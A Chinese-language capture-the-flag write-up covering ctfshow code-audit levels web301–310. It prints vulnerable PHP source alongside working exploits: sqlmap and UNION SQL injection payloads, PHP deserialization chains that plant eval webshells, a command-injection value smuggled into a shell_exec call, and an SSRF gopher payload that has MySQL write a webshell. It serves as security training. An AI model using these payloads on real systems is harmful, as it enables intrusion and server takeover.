## 写在前面

代码审计系列

——KonDream 2022年3月10日14:47:48

## web301

关键代码：checklogin.php

```php
<?php

error_reporting(0);
session_start();
require 'conn.php';
$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:"";
$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:"";
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
$_SESSION['error']="1";
header("location:login.php");

?>
```

前10行，在登录检查时没有对参数进行过滤导致存在sql注入，这里直接sqlmap梭

``python sqlmap.py -u http://7b4b2479-9fc9-4eed-8697-b694f2b25701.challenge.ctf.show/checklogin.php --data="userid=1*&userpwd=1" --batch -D sds -T sds_user --dump``

![image-20220310144908186](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310144908186.png)

拿到账号密码后无法登录？？奇怪，那利用联合查询登录吧

``userid=1' union select 1#&userpwd=1``

![image-20220310145037293](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310145037293.png)

登录成功后即可拿到flag

## web302

在判断密码处改为

```php
if(!strcasecmp(sds_decode($userpwd),$row['sds_password']))
    
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```

也就是说我们传入的 userpwd 会经过 sds_decode 函数处理，这里我也爆了一下数据库，账户密码和上一个题是一样的，无法正常登录，所以利用联合查询：

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}

echo sds_decode('admin');
?>
# 27151b7b1ad51a38ea66b1529cde5ee4
```

payload：``userid=1'union select '27151b7b1ad51a38ea66b1529cde5ee4'#&userpwd=admin``

登录进去即可

## web303

审计源码，在sds_user.sql中有这样一条数据

```sql
INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');
```

结合之前的sds_decode操作，显然密码就是admin，登录进去之后找注入点，继续看源码发现

```php
<?php
session_start();
require 'conn.php';
if(!isset($_SESSION['login'])){
header("location:login.php");
return;
}else{
	//注入点
	$_POST['dpt_name']=!empty($_POST['dpt_name'])?$_POST['dpt_name']:NULL;
	$_POST['dpt_address']=!empty($_POST['dpt_address'])?$_POST['dpt_address']:NULL;
	$_POST['dpt_build_year']=!empty($_POST['dpt_build_year'])?$_POST['dpt_build_year']:NULL;
	$_POST['dpt_has_cert']=!empty($_POST['dpt_has_cert'])?$_POST['dpt_has_cert']:NULL;
	$_POST['dpt_cert_number']=!empty($_POST['dpt_cert_number'])?$_POST['dpt_cert_number']:NULL;
	$_POST['dpt_telephone_number']=!empty($_POST['dpt_telephone_number'])?$_POST['dpt_telephone_number']:NULL;
	
	$dpt_name=$_POST['dpt_name'];
	$dpt_address=$_POST['dpt_address'];
	$dpt_build_year=$_POST['dpt_build_year'];
	$dpt_has_cert=$_POST['dpt_has_cert']=="on"?"1":"0";
	$dpt_cert_number=$_POST['dpt_cert_number'];
	$dpt_telephone_number=$_POST['dpt_telephone_number'];
	$mysqli->query("set names utf-8");
	$sql="insert into sds_dpt set sds_name='".$dpt_name."',sds_address ='".$dpt_address."',sds_build_date='".$dpt_build_year."',sds_have_safe_card='".$dpt_has_cert."',sds_safe_card_num='".$dpt_cert_number."',sds_telephone='".$dpt_telephone_number."';";
	$result=$mysqli->query($sql);
	echo $sql;
	if($result===true){
		$mysqli->close();
		header("location:dpt.php");
	}else{
		die(mysqli_error($mysqli));
	}
	
	 }

?>
```

在 add 操作中存在 insert 注入，直接 sqlmap 一把梭

``python sqlmap.py -u http://a78b07f2-18c5-4d5e-bab7-32e53633624c.challenge.ctf.show/dptadd.php --data="dpt_address=&dpt_build_year=&dpt_cert_number=&dpt_has_cert=on&dpt_name=&dpt_telephone_number=" --cookie="UM_distinctid=17ede1c056746f-0f697bd214ac7a-f791539-144000-17ede1c0568983; PHPSESSID=4lh8e8angsna8eac4v08bhuold" --batch -D sds -T sds_fl9g --dump``

![image-20220310154405140](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310154405140.png)

## web304

增加了全局waf

```php
function sds_waf($str){
	return preg_match('/[0-9]|[a-z]|-/i', $str);
}
```

不知道这个waf有啥用，姿势和上面一样

``python sqlmap.py -u http://02fec3b4-6e26-4559-80a6-23aa6ff85e75.challenge.ctf.show/dptadd.php --data="dpt_address=&dpt_build_year=&dpt_cert_number=&dpt_has_cert=on&dpt_name=&dpt_telephone_number=" --cookie="UM_distinctid=17ede1c056746f-0f697bd214ac7a-f791539-144000-17ede1c0568983; PHPSESSID=pq9v16je24q036vm433fi79i53" --batch -D sds -T sds_flaag --dump``

## web305

多了个class.php

```php
<?php

class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}

```

再看看checklogin.php

```php
<?php
error_reporting(0);
session_start();
require 'conn.php';
require 'fun.php';
require 'class.php';
$user_cookie = $_COOKIE['user'];
if(isset($user_cookie)){
	$user = unserialize($user_cookie);
}
```

嗯？？反序列化，而且在 class.php 中是有写文件操作的，那么我们就可以利用反序列化写马然后去读数据库

payload：

```php
<?php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
}

echo urlencode(serialize(new user('kkk.php', '<?=eval($_POST[k]);?>')));

# O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22kkk.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5Bk%5D%29%3B%3F%3E%22%3B%7D
```

带到 cookie 中去然后发包

![image-20220310160858949](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310160858949.png)

直接上蚁剑

![image-20220310160917567](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310160917567.png)

读数据库，真正的账号密码在conn.php中

![image-20220310160948872](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310160948872.png)

![image-20220310160957433](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220310160957433.png)

拿到flag

## web306

继续找反序列化点，在 index.php 中：

```php
<?php
session_start();
require "conn.php";
require "dao.php";
$user = unserialize(base64_decode($_COOKIE['user']));
```

跟踪一下 dao.php 这个文件

```php
<?php

require 'config.php';
require 'class.php';

class dao{
	private $config;
	private $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}
	private function init(){
		$this->conn=new mysqli($this->config->get_mysql_host(),$this->config->get_mysql_username(),$this->config->get_mysql_password(),$this->config->get_mysql_db());
	}
	public function __destruct(){
		$this->conn->close();
	}

	public function get_user_password_by_username($u){
		$sql="select sds_password from sds_user where sds_username='".$u."' order by id limit 1;";
		$result=$this->conn->query($sql);
		$row=$result->fetch_array(MYSQLI_BOTH);
		if($result->num_rows>0){
			return $row['sds_password'];
		}else{
			return '';
		}
	}

}
```

第4行，继续跟踪 class.php 

```php
<?php

class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
}

class dpt{
	public $name;
	public $address;
	public $build_year;
	public $have_cert="0";
	public $cert_num;
	public $phone;
	public function __construct($n,$a,$b,$h,$c,$p){
		$this->name=$n;
		$this->address=$a;
		$this->build_year=$b;
		$this->have_cert=$h;
		$this->cert_num=$c;
		$this->phone=$p;

	}
}
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}

}

```

很好，在 log 类中发现了敏感函数 file_put_contents，想要利用这个函数就要调用 log 类中的 close 方法，但是怎么调用呢？寻一下之前的文件，发现在 dao.php 的第10行和第18行附近有这样两个函数，恰巧在 `` __destruct`` 魔术方法中触发了close函数，``__construct``中声明了一个类

```php
public function __construct(){
    $this->config=new config();
    $this->init();
}

public function __destruct(){
    $this->conn->close();
}
```

至此，思路就很明显了，可以构造出一条反序列化链子：**index.php存在cookie的反序列化操作 -> dao.php中引用了class.php即敏感函数所在文件，在__construct中可以替换为log类 -> 触发close函数进而写入任意文件**

poc：

```php
<?php

class log{
	public $title='k.php';
	public $info='<?=phpinfo();?>';

}

class dao{
	private $conn;
	public function __construct(){
		$this->conn=new log();
	}

}

echo base64_encode(serialize(new dao()));
#  TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiJrLnBocCI7czo0OiJpbmZvIjtzOjE1OiI8Pz1waHBpbmZvKCk7Pz4iO319
```

![image-20220311225500861](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220311225500861.png)

![image-20220311225614462](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220311225614462.png)

成功getshell，flag.php在当前目录

## web307

先按上一题的思路来，观察class.php中变成了closelog函数

```php
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function closelog(){
		file_put_contents($this->title, $this->info);
	}
}
```

而在所给的代码中并没有一个去调用这个函数，所以之前的思路应该是行不通了，只能找找别的路子

发现在dao.php中有这样一个函数

```php
<?php

require 'config/config.php';
require 'class.php';


class dao{
	private $config;
	private $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}

	public function __destruct(){
		$this->conn->close();
	}

	public function  clearCache(){
		shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
	}

}
```

第21行处有一个命令执行，那是不是能通过控制 $this->config->cache_dir 的值来实现getshell呢？

发现 $this->config->cache_dir 是在config.php中的

```php
<?php
class config{
	public $cache_dir = 'cache';
}
```

继续找是在哪里调用了这个 clearCache 函数，发现是在logout.php中

```php
<?php
session_start();
error_reporting(0);
require 'service/service.php';
unset($_SESSION['login']);
unset($_SESSION['error']);
setcookie('user','',0,'/');
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
	$service->clearCache();
}

?>
```

然鹅调用的是 service.php 的函数，追踪一下 service.php

```php
<?php

define("ROOT",dirname(__FILE__));

require ROOT.'/dao/dao.php';
require ROOT.'/util/fun.php';
define("__USERNAME_MAX_LENGTH", 6);

class service{
	private $dao;
	public function __construct(){
		$this->config=new config();
		$this->dao=new dao();
	}
	public function __wakeup(){
		$this->config=new config();
		$this->dao=new dao();
	}

	public function clearCache(){
		$this->dao->clearCache();
	}
}

```

发现引用了 dao.php，那么思路就很明显了，构造出一条反序列化链子：

**在 logout.php 中对 cookie 中的参数 存在反序列化 -> 调用 dao.php 中的 clearCache -> 伪造 cache_dir 值实现命令执行**

poc：

```php
<?php
class config{
    public $cache_dir = 'cache/*;echo "<?php eval(\$_POST[1]);?>" > /var/www/html/k.php;';
}
class dao
{
    private $config;

    public function __construct()
    {
        $this->config = new config();
    }
}
echo base64_encode(serialize(new dao()));
```

![image-20220312143743189](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220312143743189.png)

![image-20220312143827889](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220312143827889.png)

## web308

ssrf 打无密码的 mysql，之前ssrf做过类似的

先按上一题思路看下，定位命令执行函数

```php
public function  clearCache(){
    if(preg_match('/^[a-z]+$/i', $this->config->cache_dir)){
        shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
    }
}
```

发现把字母都过滤了，貌似行不通了，找找其他的反序列化点，在index.php中发现了突破口

```php
<?php
session_start();
error_reporting(0);
require 'controller/service/service.php';
if(!isset($_SESSION['login'])){
header("location:login.php");
}
$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
    $lastVersion=$service->checkVersion();
}
```

跟踪一下$service->checkVersion()，在service.php中

```php
<?php

define("ROOT",dirname(__FILE__));


require ROOT.'/dao/dao.php';
require ROOT.'/util/fun.php';
define("__USERNAME_MAX_LENGTH", 6);

class service{
	private $dao;
	public function __construct(){
		$this->config=new config();
		$this->dao=new dao();
	}
	public function __wakeup(){
		$this->config=new config();
		$this->dao=new dao();
	}
	public function checkVersion(){
		return $this->dao->checkVersion();
	}
}
```

继续跟踪dao.php

```php
<?php


require 'config/config.php';
require 'class.php';


class dao{
public function checkVersion(){
		return checkUpdate($this->config->update_url);
	}
}
```

跟踪 fun.php

```PHP
<?php

function checkUpdate($url){
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		curl_close($ch);
		return $res;
	}
?>
```

明显是 ssrf 了，但有个问题是这条链子是从 index.php 开始的，也就是说必须得登录才能打 payload，但是现在也登不进去啊，怎么办

```php
	private $mysql_username='root';
	private $mysql_password='';
	private $mysql_db='sds';
	private $mysql_port=3306;
	private $mysql_host='localhost';
	public $cache_dir = 'cache';
	public $update_url = 'https://vip.ctf.show/version.txt';
```

看到 config.php 中 mysql 无密码，再联想之前的 ssrf，那应该就是用 gopher 协议打了

上工具生成payload：

![](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220312153335967.png)

poc：

```php
<?php

class config{

	public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%42%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%3d%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%6b%2e%70%68%70%22%01%00%00%00%01';

}

class dao{
	private $config;

	public function __construct(){
		$this->config=new config();
	}

}

echo base64_encode(serialize(new dao()));
```

![image-20220312153423944](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220312153423944.png)

最后getshell

## web309

mysql有密码了，且存在ssrf，那就是打 redis 或者 fastcgi 了，看了大师傅们的wp也确实是打 fastcgi，直接上工具吧

![image-20220313181911999](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220313181911999.png)

![image-20220313181929689](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220313181929689.png)

读到当前目录下的文件了，接着读flag就ok

## web310

还是 ssrf 打 fastcgi，这次没找到flag文件，直接写个马子吧

![image-20220313193828543](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220313193828543.png)

访问kk.php，直接上蚁剑

![image-20220313193907561](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220313193907561.png)

编码选base64

然后flag位置在/var/flag/index.html

![image-20220313193949552](https://cdn.jsdelivr.net/gh/KonDream/ctfshow-wp/ctfshow/web%E5%85%A5%E9%97%A8/image/ctfshow-代码审计(301-310)/image-20220313193949552.png)

## 写在最后

代码审计暂且告一段落，最后几个ssrf的利用姿势其实算是取巧了，看了其他大师傅们的wp是去读nginx配置文件然后再进行判断的，因为nginx可以通过fastcgi对接php，所以nginx的配置文件中也会有一些重要信息，这是个很好的思路，学习到了。

——KonDream 2022年3月13日19:42:09



























